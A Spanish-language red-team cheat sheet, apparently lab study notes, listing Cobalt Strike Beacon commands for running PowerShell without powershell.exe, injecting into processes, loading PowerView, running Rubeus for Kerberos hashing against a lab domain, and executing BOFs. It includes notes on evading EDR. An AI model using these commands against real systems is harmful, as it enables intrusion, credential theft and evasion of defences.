---
title: Cobalt Strike — Ejecutar Herramientas Personalizadas
tags: [cobalt-strike, post-ex, execute-assembly, powerpick, psinject, bof]
---

# Ejecutar Herramientas Personalizadas

## PowerShell Managed

```
beacon> powershell Get-Process
```

Usa `powershell.exe` — **detectable por EDR**.

## PowerShell Unmanaged (sin powershell.exe)

```
beacon> powerpick Get-Process
```

Crea un proceso `spawnto`, inyecta en él un runtime .NET y ejecuta PS sin invocar `powershell.exe`.

## Inyectar PowerShell en un PID existente

```
beacon> psinject <PID> x64 Get-Process
```

## Importar script PS (en memoria)

```
beacon> powershell-import C:\Tools\PowerView.ps1
beacon> powerpick Get-DomainUser
```

## Ejecutar .NET Assembly

```
beacon> execute-assembly C:\Tools\Rubeus.exe hash /password:Password1 /user:admin /domain:dev.cyberbotic.io
```

## BOF (Beacon Object File) — Inline

```
beacon> inline-execute C:\Tools\BOF\example.o arg1 arg2
```

> [!important] Los BOFs se ejecutan en el **hilo principal del Beacon** — no crean procesos ni threads nuevos. Máximo OPSEC.

## Ver también
- [[08-infraestructura-c2/cobalt-strike/beacon-cheatsheet/fork--and--run-commands|Fork & Run Commands]]
- [[08-infraestructura-c2/cobalt-strike/beacon-cheatsheet/inline-commands-(bof)|Inline Commands (BOF)]]
- [[08-infraestructura-c2/cobalt-strike/beacon-cheatsheet/api-only-commands|API-Only Commands]]
